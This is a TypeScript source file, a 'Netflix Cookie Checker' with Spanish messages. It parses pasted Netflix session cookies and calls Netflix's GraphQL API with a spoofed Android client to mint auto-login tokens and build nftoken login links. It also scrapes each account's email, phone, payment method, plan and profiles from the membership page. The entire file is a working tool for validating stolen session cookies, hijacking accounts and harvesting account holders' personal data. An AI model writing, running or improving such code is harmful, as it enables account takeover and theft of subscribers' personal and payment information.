// Netflix Cookie Checker - Port of Python NetflixTokenChecker to TypeScript

// ─── Types ───────────────────────────────────────────────────────────────────

export interface NFTokenResult {
  success: boolean;
  token?: string;
  link?: string;
  error?: string;
}

export interface NetflixMetadata {
  country?: string;
  countryName?: string;
  plan?: string;
  price?: string;
  currency?: string;
  videoQuality?: string;
  maxStreams?: number;
  status?: string;
  memberSince?: string;
  nextBilling?: string;
  email?: string;
  phone?: string;
  paymentMethod?: string;
  profiles?: string;
  devices?: string;
}

export interface CheckResult {
  success: boolean;
  token?: string;
  link?: string;
  metadata?: NetflixMetadata;
  error?: string;
}

// ─── Constants ───────────────────────────────────────────────────────────────

const NETFLIX_GRAPHQL_URL = "https://android13.prod.ftl.netflix.com/graphql";
const NETFLIX_MEMBERSHIP_URL = "https://www.netflix.com/account/membership";
// ================================
// PARTE 1 - EDITADA
// ================================
const NF_TOKEN_BASE = "https://netflix.com";
// ================================

const FETCH_TIMEOUT = 30000;

const DROID_USER_AGENT =
  "com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)";

import { getCountryName } from "@/lib/countries";

// ─── JSON Utilities ──────────────────────────────────────────────────────────

/** Convert \xHH escape sequences to real characters */
function cleanJsonStr(s: string): string {
  return s.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
}

/** Extract balanced JSON starting from position */
function extractBalancedForward(text: string, start: number): string | null {
  let depth = 0;
  let i = start;
  while (i < text.length) {
    const ch = text[i];
    if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        return text.substring(start, i + 1);
      }
    } else if (ch === '"') {
      i++;
      while (i < text.length) {
        if (text[i] === "\\") {
          i += 2;
          continue;
        }
        if (text[i] === '"') break;
        i++;
      }
    }
    i++;
  }
  return null;
}

/** Extract root JSON object from Netflix HTML response */
function extractRootJson(html: string): any | null {
  const reactCtxMatch = html.indexOf("netflix.reactContext = ");
  if (reactCtxMatch !== -1) {
    const start = html.indexOf("{", reactCtxMatch);
    if (start !== -1) {
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {}
      }
    }
  }

  const titleMatch = html.indexOf('{"title":"Netflix"');
  if (titleMatch !== -1) {
    const raw = extractBalancedForward(html, titleMatch);
    if (raw) {
      try {
        return JSON.parse(cleanJsonStr(raw));
      } catch {}
    }
  }

  for (const marker of ['"title":"Netflix"', '"userInfo"', '"membership"']) {
    const idx = html.indexOf(marker);
    if (idx !== -1) {
      let start = idx;
      while (start > 0 && html[start] !== "{") start--;
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {
          continue;
        }
      }
    }
  }

  return null;
}

/** Get nested dict value from object */
function getv(d: any, key: string): any {
  if (!d || typeof d !== "object") return undefined;
  return d[key];
}

/** Deep navigation in nested dict */
function dig(data: any, ...keys: string[]): any {
  let current = data;
  for (const key of keys) {
    if (current === null || current === undefined) return undefined;
    current = getv(current, key);
  }
  return current;
}

// ─── Cookie Parsing ──────────────────────────────────────────────────────────

/** Parse Netscape format cookie file content */
function parseNetscapeCookies(content: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  const lines = content.split("\n");

  for (const rawLine of lines) {
    const line = rawLine.trim();
    if (!line || line.startsWith("#")) continue;

    const parts = line.split("\t");
    if (parts.length >= 7) {
      const name = parts[5].trim();
      const value = parts[6].trim();
      if (name) {
        cookies[name] = value;
      }
    }
  }

  return cookies;
}

/** Extract cookies from JSON (Cookie Editor), Netscape, or raw string formats */
export function extractCookiesFromText(text: string): Record<string, string> | null {
  if (!text || !text.trim()) return null;

  const trimmed = text.trim();

  if (trimmed.startsWith("[") || trimmed.startsWith("{")) {
    try {
      const parsed = JSON.parse(trimmed);
      const arr = Array.isArray(parsed) ? parsed : [parsed];
      const cookies: Record<string, string> = {};

      for (const item of arr) {
        if (item && item.name && item.value !== undefined) {
          cookies[item.name] = item.value;
        }
      }

      if (Object.keys(cookies).length > 0) return cookies;
    } catch {}
  }

  if (trimmed.includes("\t")) {
    const cookies = parseNetscapeCookies(trimmed);
    if (Object.keys(cookies).length > 0) return cookies;
  }

  if (trimmed.includes("=")) {
    const cookies: Record<string, string> = {};
    const pairs = trimmed.split(";");

    for (const pair of pairs) {
      const eqIdx = pair.indexOf("=");
      if (eqIdx > 0) {
        const name = pair.substring(0, eqIdx).trim();
        const value = pair.substring(eqIdx + 1).trim();
        if (name) {
          cookies[name] = value;
        }
      }
    }

    if (Object.keys(cookies).length > 0) return cookies;
  }

  return null;
}

/** Build cookie header string from cookie dictionary */
export function buildCookieString(
  cookieDict: Record<string, string>,
  onlyAndroid: boolean = false
): string {
  const androidKeys = new Set([
    "NetflixId",
    "SecureNetflixId",
    "nfvdid",
    "clid",
    "bid",
    "pmtest",
    "uuid",
    "mtToken",
    "prid",
  ]);

  const pairs: string[] = [];

  for (const [key, value] of Object.entries(cookieDict)) {
    if (!value) continue;
    if (onlyAndroid && !androidKeys.has(key)) continue;
    pairs.push(`${key}=${value}`);
  }

  return pairs.join("; ");
}

// ─── NFToken Generation ─────────────────────────────────────────────────────

/** Call Netflix GraphQL API to generate NFToken */
export async function checkCookie(
  cookieDict: Record<string, string>
): Promise<NFTokenResult> {
  const netflixId = cookieDict["NetflixId"];
  const secureNetflixId = cookieDict["SecureNetflixId"];
  const nfvdid = cookieDict["nfvdid"];

  if (!netflixId && !secureNetflixId) {
    return {
      success: false,
      error: "No se encontraron cookies válidas (NetflixId o SecureNetflixId)",
    };
  }

  const cookieString = buildCookieString(cookieDict, true);

  const graphqlBody = JSON.stringify({
    operationName: "CreateAutoLoginToken",
    variables: {
      scope: "WEBVIEW_MOBILE_STREAMING",
    },
    extensions: {
      persistedQuery: {
        version: 102,
        id: "76e97129-f4b5-41a0-a73c-12e674896849",
      },
    },
  });

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_GRAPHQL_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": DROID_USER_AGENT,
        Cookie: cookieString,
        Accept:
          "multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json",
        Origin: "https://www.netflix.com",
        Referer: "https://www.netflix.com/",
      },
      body: graphqlBody,
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return {
        success: false,
        error: `Netflix API respondió con estado ${response.status}`,
      };
    }

    const data = await response.json();

    const tokenDirect = dig(data, "data", "createAutoLoginToken");
    const tokenNested = dig(data, "data", "createAutoLoginToken", "autoLoginToken", "token");
    const token = typeof tokenDirect === "string" ? tokenDirect : tokenNested;

    // ================================
    // PARTE 2 - EDITADA
    // ================================
    if (token) {
      const cleanToken = encodeURIComponent(token);
      const link = `${NF_TOKEN_BASE}/?nftoken=${cleanToken}`;
      return {
        success: true,
        token,
        link,
      };
    }
    // ================================

    const errors = data.errors;
    if (errors && Array.isArray(errors) && errors.length > 0) {
      const errMessage = typeof errors[0] === "string"
        ? errors[0]
        : errors[0]?.message || JSON.stringify(errors[0]);
      return { success: false, error: `API de Netflix: ${errMessage}` };
    }

    return {
      success: false,
      error: "No se pudo generar el NFToken (cookie inválida o expirada)",
    };
  } catch (err: any) {
    if (err.name === "AbortError") {
      return { success: false, error: "Timeout: Netflix no respondió a tiempo" };
    }
    return {
      success: false,
      error: `Error de conexión: ${err.message || "Desconocido"}`,
    };
  }
}

// ─── NetflixId Country Fallback (no HTTP) ─────────────────────────────────────

/**
 * Decode NetflixId cookie to extract country code without HTTP request.
 * NetflixId format: v2|timestamp|base64(JSON)|signature
 * The JSON typically contains: customerInfo.country, user.country, etc.
 */
export function extractCountryFromNetflixId(cookieDict: Record<string, string>): string | null {
  const netflixId = cookieDict["NetflixId"];
  if (!netflixId) return null;

  try {
    // NetflixId is pipe-separated: version|timestamp|base64data|signature
    const parts = netflixId.split("|");
    // The base64 data is typically the 3rd part (index 2)
    const b64Candidates: string[] = [];
    if (parts.length >= 3) {
      b64Candidates.push(parts[2]); // base64 user data
    }
    // Also try the whole string as raw base64
    b64Candidates.push(netflixId);

    for (const b64 of b64Candidates) {
      try {
        const decoded = Buffer.from(b64, "base64").toString("utf-8");
        if (!decoded || decoded.length < 5) continue;

        // Try to find and parse JSON within the decoded string
        let jsonStr = decoded;
        const jsonStart = decoded.indexOf("{");
        const jsonEnd = decoded.lastIndexOf("}");
        if (jsonStart !== -1 && jsonEnd > jsonStart) {
          jsonStr = decoded.substring(jsonStart, jsonEnd + 1);
        }

        try {
          const obj = JSON.parse(jsonStr);
          const country =
            obj?.customerInfo?.country ||
            obj?.user?.country ||
            obj?.geo?.country ||
            obj?.country ||
            obj?.billingCountry ||
            obj?.currentCountry;
          if (country && typeof country === "string" && /^[A-Z]{2}$/i.test(country)) {
            return country.toUpperCase();
          }
        } catch {
          // Not valid JSON, try regex
        }

        // Regex fallback on raw decoded string
        const m = decoded.match(/"country"\s*:\s*"([A-Z]{2})"/i);
        if (m) return m[1].toUpperCase();
      } catch {
        continue;
      }
    }
  } catch {
    // Decoding failed entirely
  }

  return null;
}

// ─── Metadata Extraction ─────────────────────────────────────────────────────

/** Fetch Netflix membership page and extract metadata */
export async function getMetadata(
  cookieDict: Record<string, string>
): Promise<NetflixMetadata> {
  const metadata: NetflixMetadata = {};
  const cookieString = buildCookieString(cookieDict, false);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_MEMBERSHIP_URL, {
      method: "GET",
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        Cookie: cookieString,
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
      },
      signal: controller.signal,
      redirect: "follow",
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return metadata;
    }

    const html = await response.text();
    const jsonData = extractRootJson(html);

    if (jsonData) {
      const userInfo = dig(jsonData, "data", "userInfo");
      if (userInfo) {
        const country = dig(userInfo, "countryOfSignup");
        if (country) {
          metadata.country = country;
          metadata.countryName = getCountryName(country);
        }

        const membership = dig(userInfo, "membership");
        if (membership) {
          const planName =
            dig(membership, "planName") ||
            dig(membership, "plan", "name") ||
            dig(membership, "plan", "description") ||
            dig(membership, "currentSubscription", "planName") ||
            dig(membership, "currentSubscription", "plan", "name") ||
            dig(membership, "currentSubscription", "plan", "description");
          if (planName && !planName.startsWith("class=")) metadata.plan = planName;
          const status = dig(membership, "status") || dig(membership, "currentSubscription", "status");
          if (status) metadata.status = status;
          const memberSince = dig(membership, "memberSince") || dig(membership, "memberSinceDate");
          if (memberSince) metadata.memberSince = memberSince;
          const nextBilling = dig(membership, "nextBillingDate") || dig(membership, "currentSubscription", "nextBillingDate");
          if (nextBilling) metadata.nextBilling = nextBilling;
        }

        const subscription = dig(userInfo, "membership", "currentSubscription");
        if (subscription) {
          const price = dig(subscription, "price") || dig(subscription, "amount");
          if (price !== undefined) metadata.price = String(price);
          const currency = dig(subscription, "currency") || dig(subscription, "priceCurrency");
          if (currency) metadata.currency = currency;
        }

        const maxScreens = dig(userInfo, "maxScreens") || dig(userInfo, "membership", "maxScreens");
        if (maxScreens !== undefined) metadata.maxStreams = Number(maxScreens);

        const email = dig(userInfo, "email") || dig(userInfo, "userEmail");
        if (email && !email.includes(".png") && !email.includes(".jpg")) metadata.email = email;

        const phone = dig(userInfo, "phone") || dig(userInfo, "phoneNumber");
        if (phone) metadata.phone = phone;
      }

      const paymentInfo = dig(jsonData, "data", "paymentInfo") || dig(jsonData, "data", "userInfo", "paymentInfo");
      if (paymentInfo) {
        const method = dig(paymentInfo, "paymentMethod") || dig(paymentInfo, "method") || dig(paymentInfo, "description");
        if (method) metadata.paymentMethod = method;
      }

      const profiles = dig(jsonData, "data", "profiles") || dig(jsonData, "data", "userInfo", "profiles");
      if (profiles) {
        if (Array.isArray(profiles)) {
          metadata.profiles = profiles.map((p: any) => p.name || p.profileName || "Sin nombre").join(", ");
        } else if (typeof profiles === "string") {
          metadata.profiles = profiles;
        }
      }

      const devices = dig(jsonData, "data", "devices") || dig(jsonData, "data", "userInfo", "devices");
      if (devices) {
        if (Array.isArray(devices)) {
          metadata.devices = `${devices.length} dispositivo(s) activo(s)`;
        } else if (typeof devices === "string") {
          metadata.devices = devices;
        }
      }
    }

    if (!metadata.country) {
      const countryRegex = /countryOfSignup['":\s]+['"]([A-Z]{2})['"]/;
      const countryMatch = html.match(countryRegex);
      if (countryMatch) {
        metadata.country = countryMatch[1];
        metadata.countryName = getCountryName(countryMatch[1]);
      }
    }

    if (!metadata.plan) {
      // Try specific JSON key patterns for plan name
      const planJsonPatterns = [
        /"planName"\s*:\s*"([^"]+)"/i,
        /"plan"\s*:\s*"([^"]+)"/i,
        /"planDescription"\s*:\s*"([^"]+)"/i,
        /"tier"\s*:\s*"([^"]+)"/i,
        /"subscriptionPlan"\s*:\s*"([^"]+)"/i,
      ];
      for (const pat of planJsonPatterns) {
        const m = html.match(pat);
        if (m) {
          metadata.plan = m[1];
          break;
        }
      }

      // Fallback: look for known plan names near "plan" keyword in HTML text
      if (!metadata.plan) {
        const knownPlans = /\b(Standard|Premium|Basic|Mobile|With Ads|Estándar|Premium|Básico|Móvil|Con anuncios)\b/i;
        const planContext = html.match(new RegExp(`plan[^<>]{0,80}?${knownPlans.source}`, "i"));
        if (planContext) {
          const planNameMatch = planContext[0].match(knownPlans);
          if (planNameMatch) metadata.plan = planNameMatch[1];
        }
      }
    }

    if (!metadata.email) {
      // Match email-like patterns but filter out image/resource file names
      const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/g;
      const allMatches = html.match(emailRegex) || [];
      const resourceExts = /\.(png|jpg|jpeg|gif|svg|webp|ico|bmp|woff|woff2|ttf|eot|css|js|mp4|webm)$/i;
      const realEmail = allMatches.find((e) => !resourceExts.test(e));
      if (realEmail) metadata.email = realEmail;
    }
  } catch (err: any) {
    console.error("Error fetching metadata:", err.message);
  }

  return metadata;
}

// ─── Full Check ──────────────────────────────────────────────────────────────

/** Full check: NFToken + metadata */
export async function fullCheck(
  cookieText: string
): Promise<CheckResult> {
  const cookieDict = extractCookiesFromText(cookieText);

  if (!cookieDict || Object.keys(cookieDict).length === 0) {
    return {
      success: false,
      error: "No se pudieron extraer cookies del texto proporcionado",
    };
  }

  const tokenResult = await checkCookie(cookieDict);

  if (!tokenResult.success) {
    return {
      success: false,
      error: tokenResult.error,
    };
  }

  let metadata: NetflixMetadata = {};
  try {
    metadata = await getMetadata(cookieDict);
  } catch {}

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  };
}
